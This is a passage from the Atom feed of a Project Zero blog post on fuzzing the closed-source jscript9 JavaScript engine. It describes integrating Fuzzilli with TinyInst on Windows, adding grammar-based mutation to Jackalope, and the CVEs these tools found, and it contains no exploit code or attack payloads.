grammar.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c2" id="h.6xk10d57ptf2"&gt;&lt;span class="c9"&gt;Approach 1: Fuzzilli + TinyInst&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/fuzzilli"&gt;Fuzzilli&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, as said above&lt;/span&gt;&lt;span&gt;, is a state-of-the-art JavaScript engine fuzzer and &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/TinyInst"&gt;TinyInst&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;is a dynamic instrumentation library. Although TinyInst is general-purpose and could be used in other applications, it comes with various features useful for fuzzing, such as out-of-the-box support for persistent fuzzing, various types of coverage instrumentations etc. TinyInst is meant to be simple to integrate with other software, in particular fuzzers, and has already been integrated with some.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;So, integrating with Fuzzilli was meant to be simple. However, there were still various challenges to overcome for different reasons:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c10"&gt;Challenge 1: Getting Fuzzilli to build on Windows where our targets are.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;   &lt;p class="c1" style="font-style: italic"&gt;&lt;span&gt;&lt;span style="font-weight: bold"&gt;Edit 2021-09-20&lt;/span&gt;: The version of Swift for Windows used in this project was from January 2021, when I first started working on it. Since version 5.4, Swift Package Manager is supported on Windows, so building Swift code should be much easier now. Additionally, static linking is supported for C/C++ code.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Fuzzilli was written in Swift and the support for Swift on Windows is currently not great. While &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/compnerd/swift-build"&gt;Swift on Windows&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;builds&lt;/span&gt;&lt;span&gt;&amp;nbsp;exist (I&amp;rsquo;m linking to the builds by Saleem Abdulrasool instead of the official ones because the latter didn&amp;rsquo;t work for me), not all features that you would find on Linux and macOS are there. For example, one does not simply run &lt;/span&gt;&lt;span class="c6"&gt;swift build&lt;/span&gt;&lt;span&gt;&amp;nbsp;on Windows, as the build system is one of the features that didn&amp;rsquo;t get ported (yet). Fortunately, CMake and Ninja &amp;nbsp;support Swift, so the solution to this problem is to switch to the CMake build system. There are &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/compnerd/swift-cmake-examples"&gt;helpful examples&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;on how to do this, once again from Saleem Abdulrasool.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Another feature that didn&amp;rsquo;t make it to Swift for Windows is statically linking libraries. This means that all libraries (such as those written in C and C++ that the user wants to include in their Swift project) need to be dynamically linked. This goes for libraries already included in the Fuzzilli project, but also for TinyInst. Since TinyInst also uses the CMake build system, my first attempt at integrating TinyInst was to include it via the Fuzzilli CMake project, and simply have it built as a shared library. However, the same tooling that was successful in building Fuzzilli would fail to build TinyInst (probably due to various platform libraries TinyInst uses). That&amp;rsquo;s why, in the end, TinyInst was being built separately into a .dll and this .dll loaded &amp;ldquo;manually&amp;rdquo; into Fuzzilli via the &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"&gt;LoadLibrary&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;API. This turned out not to be so bad - Swift build tooling for Windows was quite slow, and so it was much faster to only build TinyInst when needed, rather than build the entire Fuzzilli project (even when the changes made were minor).&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;The Linux/macOS parts of Fuzzilli, of course, also needed to be rewritten. Fortunately, it turned out that the parts that needed to be rewritten were the parts written in C, and the parts written in Swift worked as-is (other than a couple of exceptions, mostly related to networking). As someone with no previous experience with Swift, this was quite a relief. The main parts that needed to be rewritten were the networking library (libsocket), the library used to run and monitor the child process (libreprl) and the library for collecting coverage (libcoverage). The latter two were changed to use TinyInst. Since these are separate libraries in Fuzzilli, but TinyInst handles both of these tasks, some plumbing through Swift code was needed to make sure both of these libraries talk to the same TinyInst instance for a given target.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c10"&gt;Challenge 2: Threading woes&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Another feature that made the integration less straightforward than hoped for was the use of threading in Swift. TinyInst is built on a custom debugger and, on Windows, it uses the Windows debugging API. One specific feature of the Windows debugging API, for example &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent"&gt;WaitForDebugEvent&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, is that it does not take a debugee pid or a process handle as an argument. So then, the question is, if you have multiple debugees, to which of them does the API call refer? The answer to that is, when a debugger on Windows attaches to a debugee (or starts a debugee process), the &lt;/span&gt;&lt;span class="c11"&gt;thread&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp; that started/attached it is the debugger. Any subsequent calls for that particular debugee need to be issued on that same thread.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;In contrast, the preferred Swift coding style (that Fuzzilli also uses) is to take advantage of threading primitives such as &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://developer.apple.com/documentation/dispatch/dispatchqueue"&gt;DispatchQueue&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. When tasks get posted on a DispatchQueue, they can run in parallel on &amp;ldquo;background&amp;rdquo; threads. However, with the background threads, there is no guarantee that a certain task is always going to run on the same thread. So it would happen that calls to the same TinyInst instance happened from different threads, thus breaking the Windows debugging model. &lt;/span&gt;&lt;span&gt;This is why, for the purposes of this project, TinyInst was modified to create its own thread (one for each target process) and ensure that any debugger calls for a particular child process always happen on that thread.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c10"&gt;Various minor changes&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Some examples of features Fuzzilli requires that needed to be added to TinyInst are &lt;/span&gt;&lt;span&gt;stdin/stdout&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;redirection and a channel for reading out the &amp;ldquo;status&amp;rdquo; of JavaScript execution (specifically, to be able to tell if JavaScript code was throwing an exception or executing successfully). Some of these features were already integrated into the &amp;ldquo;mainline&amp;rdquo; TinyInst or will be integrated in the future.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;After all of that was completed though, the Fuzzilli/Tinyinst hybrid was running in a stable manner:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/--pEq8l8jLPI/YT-XlK0XmQI/AAAAAAAAb5s/G1ObrhExSEcKXUyktPnwqTDxtxhiW35HgCNcBGAsYHQ/s1999/image2%2B%25283%2529.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/--pEq8l8jLPI/YT-XlK0XmQI/AAAAAAAAb5s/G1ObrhExSEcKXUyktPnwqTDxtxhiW35HgCNcBGAsYHQ/s600/image2%2B%25283%2529.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Note that coverage percentage reported by Fuzzilli is incorrect. Because TinyInst is a dynamic instrumentation library, it cannot know the number of basic blocks/edges in advance. &lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Primarily because of the current Swift on Windows issues, this closed-source mode of Fuzzilli is not something we want to officially support. However, the sources and the build we used can be downloaded &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://drive.google.com/file/d/10q4bIZHYAxQRkEVSk27Z7NPjKNnB6dKq/view"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c2" id="h.xashu4kji8s8"&gt;&lt;span class="c9"&gt;Approach 2: Grammar-based mutation fuzzing with Jackalope&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/Jackalope"&gt;Jackalope&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;is a coverage-guided fuzzer I developed for fuzzing black-box binaries on Windows and, recently, macOS. Jackalope initially included mutators suitable for fuzzing of binary formats. However, a key feature of Jackalope is modularity: it is meant to be easy to plug in or replace individual components, including, but not limited to, sample mutators.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;After observing how Fuzzilli works more closely during Approach 1, as well as observing samples it generated and the bugs it found, the idea was to extend Jackalope to allow mutational JavaScript fuzzing, but also in the future, mutational fuzzing of other targets whose samples can be described by a context-free grammar.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Jackalope uses a grammar syntax similar to that of &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/domato"&gt;Domato&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but somewhat simplified (with some features not supported at this time). This grammar format is easy to write and easy to modify (but also easy to parse). The grammar syntax, as well as the list of builtin symbols, can be found on &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/Jackalope/tree/main/mutators/grammar"&gt;this page&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the JavaScript grammar used in this project can be found &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/Jackalope/tree/main/examples/grammar"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;One addition to the Domato grammar syntax that allows for more natural mutations, but also sample minimization, are the &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;repeat_*&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;grammar nodes. A &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;repeat_x&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;symbol tells the grammar engine that it can be represented as zero or more &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;x&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;nodes. For example, in our JavaScript grammar, we have&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6 c7"&gt;&amp;lt;statementlist&amp;gt; = &amp;lt;repeat_statement&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;telling the grammar engine that &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;statementlist&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be constructed by concatenating zero or more &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;statement&amp;gt;&lt;/span&gt;&lt;span&gt;s. In our JavaScript grammar, a &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;statement&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;expands to an actual JavaScript statement. This helps the mutation engine in the following way: it now knows it can mutate a sample by inserting another &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;statement&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;node anywhere in the &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;statementlist&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;node. It can also remove &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;statement&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;nodes from the &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;statementlist&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;node. Both of these operations will keep the sample valid (in the grammar sense).&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;It&amp;rsquo;s not mandatory to have &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;repeat_*&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;nodes in the grammar, as the mutation engine knows how to mutate other nodes as well (see the list of mutations below). However, including them where it makes sense might help make mutations in a more natural way, as is the case of the JavaScript grammar.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Internally, grammar-based mutation works by keeping a tree representation of the sample instead of representing the sample just as an array of bytes (Jackalope must in fact represent a grammar sample as a sequence of bytes at some points in time, e.g when storing it to disk, but does so by serializing the tree and deserializing when needed). Mutations work by modifying a part of the tree in a manner that ensures the resulting tree is still valid within the context of the input grammar. Minimization works by removing those nodes that are determined to be unnecessary.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Jackalope&amp;rsquo;s mutation engine can currently perform the following operations on the tree:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c13 lst-kix_u927wi79aeqb-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c1 c3 li-bullet-0"&gt;&lt;span&gt;Generate a new tree from scratch&lt;/span&gt;&lt;span class="c0"&gt;. This is not really a mutation and is mainly used to bootstrap the fuzzers when no input samples are provided. In fact, grammar fuzzing mode in Jackalope must either start with an empty corpus or a corpus generated by a previous session. This is because there is currently no way to parse a text file (e.g. a JavaScript source file) into its grammar tree representation (in general, there is no guaranteed unique way to parse a sample with a context-free grammar).&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c3 li-bullet-0"&gt;&lt;span class="c0"&gt;Select a random node in the sample&amp;#39;s tree representation. Generate just this node anew while keeping the rest of the tree unchanged.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c3 li-bullet-0"&gt;&lt;span class="c0"&gt;Splice: Select a random node from the current sample and a node with the same symbol from another sample. Replace the node in the current sample with a node from the other sample.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c3 li-bullet-0"&gt;&lt;span&gt;Repeat node mutation: One or more new children get added to a &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;repeat_*&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;node, or some of the existing children get replaced.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c3 li-bullet-0"&gt;&lt;span&gt;Repeat splice: Selects a &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;repeat_*&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;node from the current sample and a similar &lt;/span&gt;&lt;span class="c6"&gt;&amp;lt;repeat_*&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;node from another sample. Mixes children from the other node into the current node.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;JavaScript grammar was initially constructed by following &amp;nbsp;the &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://tc39.es/ecma262/#sec-grammar-summary"&gt;ECMAScript 2022 specification&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. However, as always when constructing fuzzing grammars from specifications or in a (semi)automated way, this grammar was only a starting point. More manual work was needed to make the grammar output valid and generate interesting samples more frequently.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Jackalope &lt;/span&gt;&lt;span&gt;now supports&lt;/span&gt;&lt;span&gt;&amp;nbsp;grammar fuzzing out-of-the box, and, in order to use it, you just need to add &lt;/span&gt;&lt;span class="c6"&gt;-grammar &amp;lt;path_to_grammar_file&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to Jackalope&amp;rsquo;s command lines. In addition to running against closed-source targets on Windows and macOS, Jackalope can now run against open-source targets on Linux using &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://clang.llvm.org/docs/SanitizerCoverage.html"&gt;Sanitizer Coverage&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;based instrumentation. This is to allow experimentation with grammar-based mutation fuzzing on open-source software.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;The following image shows Jackalope running against jscript9.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-jtMIxGNnS9U/YT-XlMGGp6I/AAAAAAAAb5w/wcthQlC_AdgBHoczjXLhpxkTvqDZSYfewCNcBGAsYHQ/s1563/image1%2B%25284%2529.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-jtMIxGNnS9U/YT-XlMGGp6I/AAAAAAAAb5w/wcthQlC_AdgBHoczjXLhpxkTvqDZSYfewCNcBGAsYHQ/s600/image1%2B%25284%2529.png" border="0" alt="Jackalope running against jscript9." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c2" id="h.fclhv96v1gpn"&gt;&lt;span class="c9"&gt;Results&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span&gt;I ran Fuzzilli for several weeks on 100 cores. This resulted in finding two vulnerabilities, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2157"&gt;CVE-2021-26419&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2168"&gt;CVE-2021-31959&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. Note that the bugs that were analyzed and determined not to have security impact are not counted here. Both of the vulnerabilities found were in the bytecode generator, a part of the JavaScript engine that is typically not very well tested by generation-based fuzzing approaches. Both of these bugs were found relatively early in the fuzzing process and would be findable even by fuzzing on a single machine.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;The second of the two bugs was particularly interesting because it initially manifested only as a NULL pointer dereference that happened occasionally, and it took quite a bit of effort (including tracing JavaScript interpreter execution &lt;/span&gt;&lt;span&gt;in cases where it crashed and in cases where it didn&amp;rsquo;t to see where the execution flow diverges&lt;/span&gt;&lt;span&gt;) to reach the root cause. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/time-travel-debugging-overview"&gt;Time travel debugging&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was also useful here - it would be quite difficult if not impossible to analyze the sample without it. The reader is referred to the &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2168"&gt;vulnerability report&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;for further details about the issue.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Jackalope was run on a similar setup: for several weeks on 100 cores. Interestingly, at least against jscript9, Jackalope with grammar-based mutations behaved quite similarly to Fuzzilli: it was hitting a similar level of coverage and finding similar bugs. It also found CVE-2021-26419 quickly into the fuzzing process. Of course, it&amp;rsquo;s easy to re-discover bugs once they have already been found with another tool, but neither the grammar engine nor the JavaScript grammar contain anything specifically meant for finding these bugs.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;About a week and a half into fuzzing with Jackalope, it triggered a bug I hadn&amp;#39;t seen before, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2188"&gt;CVE-2021-34480&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. This time, the bug was in the JIT compiler, which is another component not exercised very well with generation-based approaches. I was quite happy with this find, because it validated the feasibility of a grammar-based approach for finding JIT bugs.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c2" id="h.7g4pmu1rpz1q"&gt;&lt;span class="c9"&gt;Limitations and improvement ideas&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;While successful coverage-guided fuzzing of closed-source JavaScript engines is certainly possible as demonstrated above, it does have its limitations. The biggest one is inability to compile the target with additional debug checks. Most of the modern open-source JavaScript engines include additional checks that can be compiled in if needed, and enable catching certain types of bugs more easily, without requiring that the bug crashes the target process. If jscript9 source code included such checks, they are lost in the release build we fuzzed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Related to this, we also can&amp;rsquo;t compile the target with something like &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://clang.llvm.org/docs/AddressSanitizer.html"&gt;Address Sanitizer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The usual workaround for this on Windows would be to enable &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap"&gt;Page Heap&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;for the target. However, it does not work well here. The reason is, jscript9 uses a custom allocator for JavaScript objects. As Page Heap works by replacing the default malloc(), it simply does not apply here.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;A way to get around this would be to use instrumentation (TinyInst is already a general-purpose instrumentation library so it could be used for this in addition to code coverage) to instrument the allocator and either insert additional checks or replace it completely. However, doing this was out-of-scope for this project.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c2" id="h.pmn70hy7a340"&gt;&lt;span class="c9"&gt;Conclusion&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Coverage-guided fuzzing of closed-source targets, even complex ones such as JavaScript engines is certainly possible, and there are plenty of tools and approaches available to accomplish this.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;In the context of this project, Jackalope fuzzer was extended to allow grammar-based mutation fuzzing. These extensions have potential to be useful beyond just JavaScript fuzzing and can be adapted to other targets by simply using a different input grammar. It would be interesting to see which other targets the broader community could think of that would benefit from a mutation-based approach.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Finally, despite being targeted by security researchers for a long time now, Internet Explorer still has many exploitable bugs that can be found even without large resources. After the development on this project was complete, Microsoft announced that they will be &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"&gt;removing Internet Explorer as a separate browser&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This is a good first step, but with Internet Explorer (or Internet Explorer engine) integrated into various &lt;/span&gt;&lt;span class="c11"&gt;other&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;products (most notably, Microsoft Office, as also exploited by in-the-wild attackers), I wonder how long it will truly take before attackers stop abusing it. &lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/5444284102989534433/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/09/fuzzing-closed-source-javascript.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/5444284102989534433" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/5444284102989534433" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/09/fuzzing-closed-source-javascript.html" title="Fuzzing Closed-Source JavaScript Engines with Coverage Feedback" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/--pEq8l8jLPI/YT-XlK0XmQI/AAAAAAAAb5s/G1ObrhExSEcKXUyktPnwqTDxtxhiW35HgCNcBGAsYHQ/s72-c/image2%2B%25283%2529.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-1215474650509337553</id>
    <published>2021-08-19T09:37:00.000-07:00</published>
    <updated>2021-08-19T09:37:13.658-07:00</updated>
    <title type="text">Understanding Network Access in Windows AppContainers</title>
